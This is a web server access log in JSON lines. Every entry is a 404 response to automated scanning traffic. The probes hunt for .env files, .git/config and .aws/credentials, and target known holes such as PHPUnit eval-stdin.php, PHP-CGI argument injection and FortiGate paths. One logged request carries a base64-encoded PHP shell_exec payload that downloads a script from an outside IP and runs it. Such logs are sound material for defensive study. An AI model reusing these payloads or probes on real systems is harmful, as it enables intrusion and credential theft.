{"level":"info","message":"GET /+CSCOE+/logon.html 404 9 - 0.576 ms"}
{"level":"info","message":"GET / 404 9 - 0.225 ms"}
{"level":"info","message":"GET / 404 9 - 0.291 ms"}
{"level":"info","message":"GET /developmentserver/metadatauploader 404 9 - 2.292 ms"}
{"level":"info","message":"PROPFIND / 404 9 - 0.772 ms"}
{"level":"info","message":"GET / 404 9 - 0.353 ms"}
{"level":"info","message":"GET / 404 9 - 0.286 ms"}
{"level":"info","message":"GET /.git/index 404 9 - 0.464 ms"}
{"level":"info","message":"GET / 404 9 - 0.796 ms"}
{"level":"info","message":"GET / 404 9 - 0.392 ms"}
{"level":"info","message":"GET /fapi/v1/ticker/bookTicker?symbol=BTCUSDT 404 9 - 0.541 ms"}
{"level":"info","message":"GET /login.php 404 9 - 0.486 ms"}
{"level":"info","message":"GET / 404 9 - 0.306 ms"}
{"level":"info","message":"GET /.env.bak 404 9 - 0.284 ms"}
{"level":"info","message":"GET /.env.dev.local 404 9 - 0.370 ms"}
{"level":"info","message":"GET /build/.env 404 9 - 0.280 ms"}
{"level":"info","message":"GET /core/.git/config 404 9 - 0.295 ms"}
{"level":"info","message":"GET /static../.git/config 404 9 - 0.364 ms"}
{"level":"info","message":"GET /api/.git/config 404 9 - 0.233 ms"}
{"level":"info","message":"GET /.env.prod 404 9 - 0.301 ms"}
{"level":"info","message":"GET /.env.secret 404 9 - 0.247 ms"}
{"level":"info","message":"GET /.env.stage 404 9 - 0.275 ms"}
{"level":"info","message":"GET /config/.env 404 9 - 0.333 ms"}
{"level":"info","message":"GET /media../.git/config 404 9 - 0.243 ms"}
{"level":"info","message":"GET /.env.config 404 9 - 0.318 ms"}
{"level":"info","message":"GET /.env_sample 404 9 - 0.340 ms"}
{"level":"info","message":"GET /configuration/.env 404 9 - 0.242 ms"}
{"level":"info","message":"GET /.git/config 404 9 - 0.236 ms"}
{"level":"info","message":"GET /config.json 404 9 - 0.261 ms"}
{"level":"info","message":"GET /.env.ci 404 9 - 0.292 ms"}
{"level":"info","message":"GET /.env.live 404 9 - 0.234 ms"}
{"level":"info","message":"GET /www/.git/config 404 9 - 0.237 ms"}
{"level":"info","message":"GET /.env.production.local 404 9 - 0.279 ms"}
{"level":"info","message":"GET /.env.sandbox 404 9 - 0.227 ms"}
{"level":"info","message":"GET /.env.save 404 9 - 0.242 ms"}
{"level":"info","message":"GET /.env 404 9 - 0.289 ms"}
{"level":"info","message":"GET /.env.development.local 404 9 - 0.315 ms"}
{"level":"info","message":"GET /.env.dist 404 9 - 0.316 ms"}
{"level":"info","message":"GET /.env.staging.local 404 9 - 0.243 ms"}
{"level":"info","message":"GET /app/.git/config 404 9 - 0.252 ms"}
{"level":"info","message":"GET /backup/.git/config 404 9 - 0.268 ms"}
{"level":"info","message":"GET /settings/.env 404 9 - 0.246 ms"}
{"level":"info","message":"GET /files/.git/config 404 9 - 0.344 ms"}
{"level":"info","message":"GET /dev/.git/config 404 9 - 0.237 ms"}
{"level":"info","message":"GET /assets../.git/config 404 9 - 0.252 ms"}
{"level":"info","message":"GET /data/.git/config 404 9 - 0.228 ms"}
{"level":"info","message":"GET /.env.dev 404 9 - 0.301 ms"}
{"level":"info","message":"GET /config/.git/config 404 9 - 0.254 ms"}
{"level":"info","message":"GET /.aws/credentials 404 9 - 0.275 ms"}
{"level":"info","message":"GET /.env.uat 404 9 - 0.283 ms"}
{"level":"info","message":"GET /.env.production 404 9 - 0.251 ms"}
{"level":"info","message":"GET /.env.test 404 9 - 0.244 ms"}
{"level":"info","message":"GET /.env.testing 404 9 - 0.236 ms"}
{"level":"info","message":"GET /.env.default 404 9 - 0.267 ms"}
{"level":"info","message":"GET /prod/.env 404 9 - 0.286 ms"}
{"level":"info","message":"GET /.env.template 404 9 - 0.318 ms"}
{"level":"info","message":"GET /docker-compose.prod.yml 404 9 - 0.264 ms"}
{"level":"info","message":"GET / 404 9 - 0.261 ms"}
{"level":"info","message":"GET / 404 9 - 0.285 ms"}
{"level":"info","message":"PROPFIND / 404 9 - 0.248 ms"}
{"level":"info","message":"GET /.git/config 404 9 - 0.288 ms"}
{"level":"info","message":"GET /wordpress/wp-admin/setup-config.php 404 9 - 0.353 ms"}
{"level":"info","message":"GET /wp-admin/setup-config.php 404 9 - 0.339 ms"}
{"level":"info","message":"GET / 404 9 - 0.291 ms"}
{"level":"info","message":"GET / 404 9 - 0.410 ms"}
{"level":"info","message":"GET / 404 9 - 0.321 ms"}
{"level":"info","message":"GET /download/powershell/ 404 9 - 0.260 ms"}
{"level":"info","message":"GET /ab2g 404 9 - 0.392 ms"}
{"level":"info","message":"GET /ab2h 404 9 - 0.264 ms"}
{"level":"info","message":"GET / 404 9 - 0.877 ms"}
{"level":"info","message":"GET / 404 9 - 0.254 ms"}
{"level":"info","message":"GET /favicon.ico 404 9 - 0.252 ms"}
{"level":"info","message":"GET /wiki 404 9 - 0.294 ms"}
{"level":"info","message":"GET /favicon.ico 404 9 - 0.350 ms"}
{"level":"info","message":"PROPFIND / 404 9 - 0.428 ms"}
{"level":"info","message":"GET /login.php 404 9 - 0.531 ms"}
{"level":"info","message":"GET /.env 404 9 - 0.676 ms"}
{"level":"info","message":"GET / 404 9 - 0.304 ms"}
{"level":"info","message":"GET / 404 9 - 0.666 ms"}
{"level":"info","message":"GET /favicon.ico 404 9 - 0.442 ms"}
{"level":"info","message":"GET / 404 9 - 0.301 ms"}
{"level":"info","message":"PROPFIND / 404 9 - 0.393 ms"}
{"level":"info","message":"GET /.git/config 404 9 - 0.577 ms"}
{"level":"info","message":"GET /owa/auth/logon.aspx 404 9 - 0.240 ms"}
{"level":"info","message":"GET / 404 9 - 0.385 ms"}
{"level":"info","message":"POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input 404 9 - 12.904 ms"}
{"level":"info","message":"GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 9 - 0.455 ms"}
{"level":"info","message":"GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php 404 9 - 0.315 ms"}
{"level":"info","message":"GET /vendor/phpunit/src/Util/PHP/eval-stdin.php 404 9 - 0.394 ms"}
{"level":"info","message":"GET /vendor/phpunit/Util/PHP/eval-stdin.php 404 9 - 0.612 ms"}
{"level":"info","message":"GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php 404 9 - 0.304 ms"}
{"level":"info","message":"GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 9 - 0.270 ms"}
{"level":"info","message":"GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 9 - 0.354 ms"}
{"level":"info","message":"GET /phpunit/phpunit/Util/PHP/eval-stdin.php 404 9 - 0.341 ms"}
{"level":"info","message":"GET /phpunit/src/Util/PHP/eval-stdin.php 404 9 - 0.296 ms"}
{"level":"info","message":"GET /phpunit/Util/PHP/eval-stdin.php 404 9 - 0.260 ms"}
{"level":"info","message":"GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 9 - 0.256 ms"}
{"level":"info","message":"GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php 404 9 - 0.318 ms"}
{"level":"info","message":"GET /lib/phpunit/src/Util/PHP/eval-stdin.php 404 9 - 0.262 ms"}
{"level":"info","message":"GET /lib/phpunit/Util/PHP/eval-stdin.php 404 9 - 0.263 ms"}
{"level":"info","message":"GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 9 - 0.269 ms"}
{"level":"info","message":"GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 9 - 0.358 ms"}
{"level":"info","message":"GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 9 - 0.317 ms"}
{"level":"info","message":"GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 9 - 0.307 ms"}
{"level":"info","message":"GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 9 - 0.315 ms"}
{"level":"info","message":"GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 9 - 0.265 ms"}
{"level":"info","message":"GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 9 - 0.336 ms"}
{"level":"info","message":"GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 9 - 0.314 ms"}
{"level":"info","message":"GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 9 - 0.295 ms"}
{"level":"info","message":"GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 9 - 0.414 ms"}
{"level":"info","message":"GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 9 - 0.270 ms"}
{"level":"info","message":"GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 9 - 0.283 ms"}
{"level":"info","message":"GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 9 - 0.280 ms"}
{"level":"info","message":"GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 9 - 0.340 ms"}
{"level":"info","message":"GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 9 - 0.263 ms"}
{"level":"info","message":"GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 9 - 0.290 ms"}
{"level":"info","message":"GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 9 - 0.256 ms"}
{"level":"info","message":"GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 9 - 0.355 ms"}
{"level":"info","message":"GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 9 - 0.274 ms"}
{"level":"info","message":"GET /.git/config 404 9 - 1.460 ms"}
{"level":"info","message":"GET /robots.txt 404 9 - 0.461 ms"}
{"level":"info","message":"GET / 404 9 - 0.229 ms"}
{"level":"info","message":"GET /login.php 404 9 - 0.459 ms"}
{"level":"info","message":"GET / 404 9 - 0.550 ms"}
{"level":"info","message":"PROPFIND / 404 9 - 0.308 ms"}
{"level":"info","message":"GET / 404 9 - 0.243 ms"}
{"level":"info","message":"GET /favicon.ico 404 9 - 0.259 ms"}
{"level":"info","message":"GET /api/v2/static/not.found 404 9 - 0.303 ms"}
{"level":"info","message":"GET /api/v2/static/not.found 404 9 - 0.321 ms"}
{"level":"info","message":"GET /remote/logincheck 404 9 - 0.385 ms"}
{"level":"info","message":"GET /remote/logincheck 404 9 - 0.374 ms"}
{"level":"info","message":"GET /fonts/ftnt-icons.woff 404 9 - 0.348 ms"}
{"level":"info","message":"GET /fonts/ftnt-icons.woff 404 9 - 0.187 ms"}
{"level":"info","message":"GET /login?redir=/ng 404 9 - 0.264 ms"}
{"level":"info","message":"GET /login?redir=/ng 404 9 - 0.277 ms"}
{"level":"info","message":"GET /lang/custom/sbin/init 404 9 - 0.279 ms"}
{"level":"info","message":"GET /lang/custom/sbin/init 404 9 - 0.407 ms"}
{"level":"info","message":"GET /static/lang/custom/sbin/init 404 9 - 0.291 ms"}
{"level":"info","message":"GET /static/lang/custom/sbin/init 404 9 - 0.262 ms"}
{"level":"info","message":"GET /lang/legacy/filechecksum 404 9 - 0.300 ms"}
{"level":"info","message":"GET /lang/legacy/filechecksum 404 9 - 0.370 ms"}
{"level":"info","message":"GET /migadmin/lang/legacy/legacy/filechecksum 404 9 - 0.270 ms"}
{"level":"info","message":"GET /migadmin/lang/legacy/legacy/filechecksum 404 9 - 0.367 ms"}
{"level":"info","message":"GET /.git/config 404 9 - 0.371 ms"}
{"level":"info","message":"GET / 404 9 - 0.894 ms"}
{"level":"info","message":"GET /.env 404 9 - 0.267 ms"}
{"level":"info","message":"GET /.git/config 404 9 - 0.259 ms"}
{"level":"info","message":"GET /wordpress/wp-admin/setup-config.php 404 9 - 0.482 ms"}
{"level":"info","message":"GET /wp-admin/setup-config.php 404 9 - 0.296 ms"}
{"level":"info","message":"PROPFIND / 404 9 - 0.978 ms"}
{"level":"info","message":"GET / 404 9 - 0.306 ms"}
{"level":"info","message":"GET / 404 9 - 0.399 ms"}
{"level":"info","message":"GET / 404 9 - 0.298 ms"}
{"level":"info","message":"GET / 404 9 - 0.501 ms"}
{"level":"info","message":"GET / 404 9 - 0.253 ms"}
{"level":"info","message":"GET /favicon.ico 404 9 - 0.353 ms"}
{"level":"info","message":"GET /favicon.ico 404 9 - 0.325 ms"}
{"level":"info","message":"GET /ads.txt 404 9 - 0.235 ms"}
{"level":"info","message":"GET /app-ads.txt 404 9 - 0.324 ms"}
{"level":"info","message":"GET /sellers.json 404 9 - 0.303 ms"}
{"level":"info","message":"GET / 404 9 - 0.409 ms"}
{"level":"info","message":"GET /webui/ 404 9 - 0.355 ms"}
{"level":"info","message":"GET /favicon.ico 404 9 - 0.244 ms"}
{"level":"info","message":"GET / 404 9 - 0.362 ms"}
{"level":"info","message":"GET /store/public/assets/auth/img/logo.png 404 9 - 0.822 ms"}
{"level":"info","message":"GET /geoserver/web/ 404 9 - 0.232 ms"}
{"level":"info","message":"GET /.git/config 404 9 - 0.250 ms"}
{"level":"info","message":"PROPFIND / 404 9 - 1.093 ms"}
{"level":"info","message":"GET /.git/config 404 9 - 0.865 ms"}
{"level":"info","message":"GET / 404 9 - 0.958 ms"}
{"level":"info","message":"GET /actuator/health 404 9 - 0.954 ms"}
{"level":"info","message":"GET /index.php?p=admin/dashboard&a=<?=shell_exec(base64_decode(\"Y3VybCAxNzYuNjUuMTQ4LjcyIHwgc2g=\"));die()?> 404 9 - 0.403 ms"}
{"level":"info","message":"GET / 404 9 - 0.737 ms"}
{"level":"info","message":"GET / 404 9 - 0.550 ms"}
{"level":"info","message":"GET / 404 9 - 0.260 ms"}
{"level":"info","message":"GET /favicon.ico 404 9 - 0.270 ms"}
{"level":"info","message":"GET /robots.txt 404 9 - 0.290 ms"}
{"level":"info","message":"PROPFIND / 404 9 - 0.445 ms"}
{"level":"info","message":"HEAD / 404 9 - 0.551 ms"}
{"level":"info","message":"GET / 404 9 - 0.225 ms"}
{"level":"info","message":"GET /favicon.ico 404 9 - 0.239 ms"}
{"level":"info","message":"GET /favicon.ico 404 9 - 0.273 ms"}
{"level":"info","message":"GET /fapi/v1/ticker/bookTicker?symbol=BTCUSDT 404 9 - 0.286 ms"}
{"level":"info","message":"GET /ads.txt 404 9 - 0.263 ms"}
{"level":"info","message":"GET /app-ads.txt 404 9 - 0.289 ms"}
{"level":"info","message":"GET /sellers.json 404 9 - 0.266 ms"}
{"level":"info","message":"GET /robots.txt 404 9 - 0.880 ms"}
{"level":"info","message":"GET / 404 9 - 0.263 ms"}
{"level":"info","message":"GET / 404 9 - 0.252 ms"}
{"level":"info","message":"GET /favicon.ico 404 9 - 0.239 ms"}
{"level":"info","message":"GET /_profiler/phpinfo 404 9 - 0.301 ms"}
{"level":"info","message":"GET /_profiler/phpinfo.php 404 9 - 0.277 ms"}
{"level":"info","message":"GET /phpinfo 404 9 - 0.288 ms"}
{"level":"info","message":"GET /phpinfo.php 404 9 - 0.275 ms"}
{"level":"info","message":"GET /info 404 9 - 0.234 ms"}
{"level":"info","message":"GET /info.php 404 9 - 0.361 ms"}
{"level":"info","message":"GET /.env 404 9 - 0.281 ms"}
{"level":"info","message":"GET /app/.env 404 9 - 0.259 ms"}
{"level":"info","message":"GET /.env.bak 404 9 - 0.231 ms"}
{"level":"info","message":"GET /.env.example 404 9 - 0.245 ms"}
{"level":"info","message":"GET /.env.local 404 9 - 0.231 ms"}
{"level":"info","message":"GET /.env.old 404 9 - 0.255 ms"}
{"level":"info","message":"GET /.env.prod 404 9 - 0.241 ms"}
{"level":"info","message":"GET /.env.production.local 404 9 - 0.295 ms"}
{"level":"info","message":"GET /.env.stage 404 9 - 0.307 ms"}
{"level":"info","message":"GET /admin/.env 404 9 - 0.261 ms"}
{"level":"info","message":"GET /api/.env 404 9 - 1.411 ms"}
{"level":"info","message":"GET /apps/.env 404 9 - 0.286 ms"}
{"level":"info","message":"GET /.git/config 404 9 - 0.358 ms"}
{"level":"info","message":"PROPFIND / 404 9 - 0.277 ms"}
{"level":"info","message":"GET / 404 9 - 0.977 ms"}
{"level":"info","message":"GET /pdown 404 9 - 0.278 ms"}
{"level":"info","message":"GET /pdown 404 9 - 0.531 ms"}
{"level":"info","message":"GET / 404 9 - 23.327 ms"}
